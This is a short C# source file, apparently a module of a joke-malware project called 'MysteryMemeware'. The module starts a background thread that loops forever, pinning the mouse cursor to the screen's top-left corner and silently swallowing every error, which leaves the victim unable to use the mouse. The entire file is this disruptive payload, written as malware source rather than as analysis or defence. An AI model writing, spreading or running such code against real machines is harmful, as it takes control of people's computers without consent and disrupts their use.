using MysteryHelper;

namespace MysteryMemeware
{
    public static class CursorControlModule
    {
        public static void Run()
        {
            try
            {
                System.Threading.Thread cursorControlThread = new System.Threading.Thread(() =>
                {
                    while (true)
                    {
                        try
                        {
                            Win32InputHelper.SetMousePosition(0, 0);
                        }
                        catch
                        {

                        }
                    }
                });
                cursorControlThread.Start();
            }
            catch
            {

            }
        }
    }
}